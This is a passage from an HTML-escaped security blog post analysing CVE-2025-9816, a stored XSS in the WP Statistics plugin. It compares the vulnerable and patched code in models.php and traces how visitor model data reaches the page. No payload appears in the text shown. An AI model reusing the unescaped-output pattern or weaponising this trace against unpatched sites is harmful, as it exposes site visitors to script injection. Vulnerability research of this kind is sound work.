1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;WP Statistics – The Most Popular Privacy-Friendly Analytics Plugin&lt;/strong&gt; for WordPress has a &lt;strong&gt;Stored Cross-Site Scripting (XSS)&lt;/strong&gt; vulnerability via the &lt;strong&gt;User-Agent Header&lt;/strong&gt; in all versions up to and including &lt;strong&gt;14.15.4&lt;/strong&gt;. The root cause is insufficient &lt;strong&gt;input validation/filtering&lt;/strong&gt; and &lt;strong&gt;output escaping&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;This vulnerability allows an &lt;strong&gt;unauthenticated attacker&lt;/strong&gt; to inject malicious JavaScript into the system. The injected scripts will execute whenever a user visits a page containing the malicious data, posing severe security and privacy risks.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9816&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9816&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting (XSS)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 14.15.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 14.15.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-statistics/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Statistics Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;WP Statistics&lt;/strong&gt;: &lt;strong&gt;v14.15.4&lt;/strong&gt; (vulnerable) and &lt;strong&gt;v14.15.5&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff comparison tool to inspect differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;I initially missed some details while collecting information about this CVE; the &lt;a href=&#34;https://plugins.trac.wordpress.org/browser/wp-statistics/tags/14.15.3/includes/admin/templates/pages/devices/models.php#L31&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;references&lt;/a&gt; of &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9816&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.cve.org/CVERecord?id=CVE-2025-9816&lt;/a&gt; point to where the vulnerability occurs: &lt;code&gt;includes/admin/templates/pages/devices/models.php&lt;/code&gt;{: .filepath}&lt;/p&gt;&#xA;&lt;p&gt;But I overlooked it and used &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; to compare code. Because the code changed a lot, I proactively searched for files related to &lt;strong&gt;user-agent&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-08-cve-2025-9816/dif1.png&#39; alt=&#34;Diff — so sánh thay đổi mã giữa bản vulnerable và bản vá&#34; height=&#34;887&#34; width=&#34;1839&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;The changes in &lt;code&gt;UserAgent.php&lt;/code&gt; made me believe the vulnerability truly occurs there.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-08-cve-2025-9816/dif2.png&#39; alt=&#34;Diff — Sự thay đổi mã trong UserAgent.php&#34; height=&#34;341&#34; width=&#34;1730&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;It cost me quite a bit of time but I couldn’t fully analyze it at that point. However, this effort helped the overall analysis.&lt;/p&gt;&#xA;&lt;p&gt;🍀 Fortunately, guided by senior researchers, I &lt;strong&gt;focused&lt;/strong&gt; on the correct &lt;a href=&#34;https://plugins.trac.wordpress.org/browser/wp-statistics/tags/14.15.3/includes/admin/templates/pages/devices/models.php#L31&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;vulnerability location&lt;/strong&gt;&lt;/a&gt;. That made the analysis easier.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Tip: This is a Cross Site Scripting vulnerability that happens in the victim’s browser, so you need to find where it is first rendered into HTML.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The vulnerability occurs in file &lt;code&gt;includes/admin/templates/pages/devices/models.php&lt;/code&gt;{: .filepath} at line 31.&lt;/p&gt;&#xA;&lt;p&gt;In the &lt;strong&gt;vulnerable&lt;/strong&gt; version, &lt;code&gt;$item-&amp;gt;model&lt;/code&gt; is printed into HTML without any protection:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;span title=&amp;#34;&amp;lt;?php echo \WP_STATISTICS\Admin_Template::unknownToNotSet($item-&amp;gt;model); ?&amp;gt;&amp;#34; class=&amp;#34;wps-model-name&amp;#34;&amp;gt;&#xA;    &amp;lt;?php echo self::isUnknown($item-&amp;gt;model) ? esc_html__(&amp;#39;Unknown&amp;#39;, &amp;#39;wp-statistics&amp;#39;) : $item-&amp;gt;model; ?&amp;gt;&#xA;&amp;lt;/span&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;strong&gt;patched&lt;/strong&gt; version, &lt;code&gt;$item-&amp;gt;model&lt;/code&gt; is protected by wrapping it with &lt;code&gt;esc_attr()&lt;/code&gt; and &lt;code&gt;esc_html()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;span title=&amp;#34;&amp;lt;?php echo esc_attr(\WP_STATISTICS\Admin_Template::unknownToNotSet($item-&amp;gt;model)); ?&amp;gt;&amp;#34; class=&amp;#34;wps-model-name&amp;#34;&amp;gt;&#xA;    &amp;lt;?php echo self::isUnknown($item-&amp;gt;model) ? esc_html__(&amp;#39;Unknown&amp;#39;, &amp;#39;wp-statistics&amp;#39;) : esc_html($item-&amp;gt;model); ?&amp;gt;&#xA;&amp;lt;/span&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 The patch adds output escaping for &lt;code&gt;$item-&amp;gt;model&lt;/code&gt;, ensuring it is &lt;strong&gt;escaped&lt;/strong&gt; before being printed to HTML.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-08-cve-2025-9816/dif3.png&#39; alt=&#34;Diff — Sự thay đổi mã trong models.php&#34; height=&#34;85&#34; width=&#34;1771&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;use WP_STATISTICS\Helper;&#xA;?&amp;gt;&#xA;&#xA;&amp;lt;div class=&amp;#34;postbox-container wps-postbox-full&amp;#34;&amp;gt;&#xA;  &amp;lt;?php if (!empty($data[&amp;#39;visitors&amp;#39;])) : ?&amp;gt;&#xA;      &amp;lt;div class=&amp;#34;o-table-wrapper&amp;#34;&amp;gt;&#xA;          &amp;lt;table width=&amp;#34;100%&amp;#34; class=&amp;#34;o-table wps-new-table&amp;#34;&amp;gt;&#xA;              &amp;lt;thead&amp;gt;&#xA;              &amp;lt;/thead&amp;gt;&#xA;              &amp;lt;tbody&amp;gt;&#xA;                  &amp;lt;?php foreach ($data[&amp;#39;visitors&amp;#39;] as $item) : ?&amp;gt;&#xA;                      &amp;lt;tr&amp;gt;&#xA;                          &amp;lt;td class=&amp;#34;wps-pd-l&amp;#34;&amp;gt;&#xA;                              &amp;lt;span title=&amp;#34;&amp;lt;?php echo \WP_STATISTICS\Admin_Template::unknownToNotSet($item-&amp;gt;model); ?&amp;gt;&amp;#34; class=&amp;#34;wps-model-name&amp;#34;&amp;gt;&#xA;                                  &amp;lt;?php echo self::isUnknown($item-&amp;gt;model) ? esc_html__(&amp;#39;Unknown&amp;#39;, &amp;#39;wp-statistics&amp;#39;) : $item-&amp;gt;model; ?&amp;gt;&#xA;                              &amp;lt;/span&amp;gt;&#xA;                          &amp;lt;/td&amp;gt;&#xA;                      &amp;lt;/tr&amp;gt;&#xA;                  &amp;lt;?php endforeach; ?&amp;gt;&#xA;              &amp;lt;/tbody&amp;gt;&#xA;          &amp;lt;/table&amp;gt;&#xA;      &amp;lt;/div&amp;gt;&#xA;  &amp;lt;?php else : ?&amp;gt;&#xA;      &amp;lt;div class=&amp;#34;o-wrap o-wrap--no-data wps-center&amp;#34;&amp;gt;&#xA;          &amp;lt;?php esc_html_e(&amp;#39;No recent data available.&amp;#39;, &amp;#39;wp-statistics&amp;#39;); ?&amp;gt;&#xA;      &amp;lt;/div&amp;gt;&#xA;  &amp;lt;?php endif; ?&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If &lt;code&gt;$data&lt;/code&gt; is not empty it iterates over &lt;code&gt;$data&lt;/code&gt; and displays statistical visitor data including &lt;code&gt;model&lt;/code&gt;. If empty it prints &lt;code&gt;No recent data available.&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function isUnknown($value)&#xA;{&#xA;    if (empty($value) or $value == &amp;#39;Unknown&amp;#39; or $value == __(&amp;#34;Unknown&amp;#34;, &amp;#39;wp-statistics&amp;#39;)) {&#xA;        return true;&#xA;    }&#xA;&#xA;    return false;&#xA;}&#xA;&#xA;public static function unknownToNotSet($value)&#xA;{&#xA;    if (self::isUnknown($value)) {&#xA;        return __(&amp;#39;(not set)&amp;#39;, &amp;#39;wp-statistics&amp;#39;);&#xA;    }&#xA;    return $value;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;unknownToNotSet()&lt;/code&gt; returns &lt;code&gt;(not set)&lt;/code&gt; if &lt;code&gt;$item-&amp;gt;model&lt;/code&gt; is empty, &lt;code&gt;Unknown&lt;/code&gt;, or the translated &lt;code&gt;Unknown&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;__(&amp;quot;Unknown&amp;quot;, &#39;wp-statistics&#39;)&lt;/code&gt; looks up the translation of &lt;code&gt;Unknown&lt;/code&gt; in the plugin’s &lt;code&gt;.po&lt;/code&gt;/&lt;code&gt;.mo&lt;/code&gt; files.&lt;/p&gt;&#xA;&lt;p&gt;👉 There is no protection for &lt;code&gt;$item-&amp;gt;model&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$data&lt;/code&gt; is not initialized in this file so it’s certain that it is created elsewhere and &lt;code&gt;models.php&lt;/code&gt;{: .filepath} uses it when included. We could search for &lt;code&gt;models.php&lt;/code&gt; to find where it is called, but here it is included dynamically. Instead, I searched for the containing folder &lt;code&gt;pages/devices&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-08-cve-2025-9816/search1.png&#39; alt=&#34;Diff — Cách các template được gọi động&#34; height=&#34;340&#34; width=&#34;1621&#34;&gt;&#xA;&lt;em&gt;Diff — How templates are included dynamically&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 &lt;code&gt;models.php&lt;/code&gt;{: .filepath} is called dynamically in the &lt;code&gt;render()&lt;/code&gt; function of the &lt;code&gt;TabsView&lt;/code&gt; class:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class TabsView extends BaseTabView&#xA;{&#xA;    public function render()&#xA;    {&#xA;        $currentTab  = $this-&amp;gt;getCurrentTab();&#xA;        $data        = $this-&amp;gt;getTabData();&#xA;&#xA;        $args = [&#xA;            &amp;#39;title&amp;#39;           =&amp;gt; esc_html__(&amp;#39;Devices&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;            &amp;#39;pageName&amp;#39;        =&amp;gt; Menus::get_page_slug(&amp;#39;devices&amp;#39;),&#xA;            &amp;#39;paged&amp;#39;           =&amp;gt; Admin_Template::getCurrentPaged(),&#xA;            &amp;#39;custom_get&amp;#39;      =&amp;gt; [&amp;#39;tab&amp;#39; =&amp;gt; $currentTab],&#xA;            &amp;#39;data&amp;#39;            =&amp;gt; $data,&#xA;            &amp;#39;viewMoreUrlArgs&amp;#39; =&amp;gt; [&amp;#39;type&amp;#39; =&amp;gt; &amp;#39;single-&amp;#39; . rtrim($currentTab, &amp;#39;s&amp;#39;), &amp;#39;from&amp;#39; =&amp;gt; Request::get(&amp;#39;from&amp;#39;), &amp;#39;to&amp;#39; =&amp;gt; Request::get(&amp;#39;to&amp;#39;)],&#xA;            &amp;#39;tabs&amp;#39;            =&amp;gt; [&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;overview&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Overview&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ],&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;browsers&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Browsers&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ],&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;platforms&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Operating Systems&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ],&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;models&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Device Models&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ],&#xA;                [&#xA;                    &amp;#39;link&amp;#39;        =&amp;gt; Menus::admin_url(&amp;#39;devices&amp;#39;, [&amp;#39;tab&amp;#39; =&amp;gt; &amp;#39;categories&amp;#39;]),&#xA;                    &amp;#39;title&amp;#39;       =&amp;gt; esc_html__(&amp;#39;Device Categories&amp;#39;, &amp;#39;wp-statistics&amp;#39;),&#xA;                ]&#xA;            ],&#xA;        ];&#xA;&#xA;        Admin_Template::get_template([&amp;#39;layout/header&amp;#39;, &amp;#39;layout/tabbed-page-header&amp;#39;, &amp;#34;pages/devices/$currentTab&amp;#34;, &amp;#39;layout/postbox.hide&amp;#39;, &amp;#39;layout/footer&amp;#39;], $args);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There is correlation between the values in &lt;code&gt;$args&lt;/code&gt; and the Devices submenu.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-08-cve-2025-9816/submenu.png&#39; alt=&#34;Diff — Sự tương quan giữa các giá trị trong $args và submenu Devices&#34; height=&#34;820&#34; width=&#34;862&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;tab&lt;/code&gt; value in &lt;code&gt;args&lt;/code&gt; corresponds to the &lt;code&gt;tab&lt;/code&gt; URL parameter =&amp;gt; the scope of tracing is the Devices admin submenu. We need to determine &lt;code&gt;$currentTab&lt;/code&gt; to know how &lt;code&gt;render()&lt;/code&gt; calls &lt;code&gt;models.php&lt;/code&gt;{: .filepath} and &lt;code&gt;$data&lt;/code&gt; for possible payload injection.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Variable $currentTab&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// $currentTab  = $this-&amp;gt;getCurrentTab();&#xA;protected function getCurrentTab()&#xA;{&#xA;    return Request::get(&amp;#39;tab&amp;#39;, $this-&amp;gt;defaultTab);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getCurrentTab()&lt;/code&gt; returns the value from &lt;code&gt;Request::get()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// $param=&amp;#39;tab&amp;#39;&#xA;public static function get($param, $default = false, $return = &amp;#39;string&amp;#39;)&#xA;{&#xA;    if (empty($_REQUEST[$param])) return $default;&#xA;&#xA;    $value = $_REQUEST[$param];&#xA;&#xA;    if ($return === &amp;#39;string&amp;#39;) {&#xA;        return sanitize_text_field($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;url&amp;#39;) {&#xA;        return sanitize_url($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;number&amp;#39;) {&#xA;        return intval($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;text&amp;#39;) {&#xA;        return sanitize_textarea_field($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;bool&amp;#39;) {&#xA;        return boolval($value);&#xA;    }&#xA;&#xA;    if ($return === &amp;#39;array&amp;#39; &amp;amp;&amp;amp; is_array($value)) {&#xA;        return array_map(&amp;#39;sanitize_text_field&amp;#39;, $value);&#xA;    }&#xA;&#xA;    return $value;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 &lt;code&gt;get()&lt;/code&gt; returns the value of the &lt;code&gt;&#39;tab&#39;&lt;/code&gt; parameter from &lt;code&gt;$_REQUEST[&#39;tab&#39;]&lt;/code&gt;, e.g.:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp-admin/admin.php?page=wps_devices_page&amp;amp;tab=models &amp;lt;-- $value=models&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 &lt;code&gt;$currentTab&lt;/code&gt; is the value of the &lt;code&gt;tab&lt;/code&gt; parameter.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Variable $data&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// $data = $this-&amp;gt;getTabData();&#xA;protected function getTabData()&#xA;{&#xA;    $currentTab     = ucwords($this-&amp;gt;getCurrentTab(), &amp;#39;-&amp;#39;);&#xA;    $tabDataMethod  = &amp;#39;get&amp;#39; . str_replace(&amp;#39;-&amp;#39;, &amp;#39;&amp;#39;, $currentTab) . &amp;#39;Data&amp;#39;; // getModelsData&#xA;&#xA;    if (!method_exists($this, $tabDataMethod)) {&#xA;        // Filter to add data for locked tab&#xA;        return apply_filters(&amp;#34;wp_statistics_{$this-&amp;gt;getCurrentPage()}_{$this-&amp;gt;getCurrentTab()}_data&amp;#34;, []);&#xA;    };&#xA;&#xA;    return $this-&amp;gt;$tabDataMethod();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getTabData()&lt;/code&gt; is defined in the abstract class &lt;code&gt;BaseTabView&lt;/code&gt;, and &lt;code&gt;TabsView&lt;/code&gt; inherits it so &lt;code&gt;$data = $this-&amp;gt;getTabData();&lt;/code&gt; is how &lt;code&gt;TabsView&lt;/code&gt; calls the inherited function.&lt;/p&gt;&#xA;&lt;p&gt;We are focusing on &lt;strong&gt;model&lt;/strong&gt; so the tab here is &lt;code&gt;models&lt;/code&gt;, hence &lt;code&gt;$tabDataMethod&lt;/code&gt; becomes &lt;code&gt;&#39;getModelsData&#39;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;If &lt;code&gt;getModelsData()&lt;/code&gt; does not exist then the filter hook &lt;code&gt;wp_statistics_wps_devices_page_models_data&lt;/code&gt; is applied. But here &lt;code&gt;getModelsData()&lt;/code&gt; is defined in &lt;code&gt;TabsView&lt;/code&gt;, and &lt;code&gt;$this&lt;/code&gt; is &lt;code&gt;TabsView&lt;/code&gt;, so &lt;code&gt;TabsView&lt;/code&gt;’s &lt;code&gt;getModelsData()&lt;/code&gt; is called.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __construct()&#xA;{&#xA;    parent::__construct();&#xA;&#xA;    $this-&amp;gt;dataProvider = new DevicesDataProvider([&#xA;        &amp;#39;per_page&amp;#39; =&amp;gt; 10,&#xA;        &amp;#39;page&amp;#39;     =&amp;gt; Admin_Template::getCurrentPaged()&#xA;    ]);&#xA;}&#xA;&#xA;public function getModelsData()&#xA;{&#xA;    return $this-&amp;gt;dataProvider-&amp;gt;getModelsData();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getModelsData()&lt;/code&gt; returns the result of &lt;code&gt;getModelsData()&lt;/code&gt; in &lt;code&gt;DevicesDataProvider&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __construct($args)&#xA;{&#xA;    $this-&amp;gt;args = $args;&#xA;&#xA;    $this-&amp;gt;visitorsModel = new VisitorsModel();&#xA;}&#xA;&#xA;public function getModelsData()&#xA;{&#xA;    $args = array_merge($this-&amp;gt;args, [&#xA;        &amp;#39;field&amp;#39;    =&amp;gt; &amp;#39;model&amp;#39;,&#xA;        &amp;#39;group_by&amp;#39; =&amp;gt; [&amp;#39;model&amp;#39;]&#xA;    ]);&#xA;&#xA;    $visitors = $this-&amp;gt;visitorsModel-&amp;gt;getVisitorsDevices($args);&#xA;&#xA;    if (! empty($visitors)) {&#xA;        $visitors = array_reduce($visitors, function ($carry, $item) {&#xA;            // Trim whitespace and default empty models to &amp;#39;Unknown&amp;#39;&#xA;            $model = trim($item-&amp;gt;model ?? &amp;#39;&amp;#39;);&#xA;&#xA;            if ($model === &amp;#39;&amp;#39;) {&#xA;                $model = &amp;#39;Unknown&amp;#39;;&#xA;            }&#xA;&#xA;            if (isset($carry[$model])) {&#xA;                $carry[$model]-&amp;gt;visitors &amp;#43;= $item-&amp;gt;visitors;&#xA;            } else {&#xA;                $carry[$model] = (object)[&#xA;                    &amp;#39;model&amp;#39;    =&amp;gt; $model,&#xA;                    &amp;#39;visitors&amp;#39; =&amp;gt; $item-&amp;gt;visitors&#xA;                ];&#xA;            }&#xA;            return $carry;&#xA;        }, []);&#xA;    }&#xA;&#xA;    return [&#xA;        &amp;#39;visitors&amp;#39; =&amp;gt; $visitors,&#xA;        &amp;#39;total&amp;#39;    =&amp;gt; $this-&amp;gt;visitorsModel-&amp;gt;countColumnDistinct($args),&#xA;        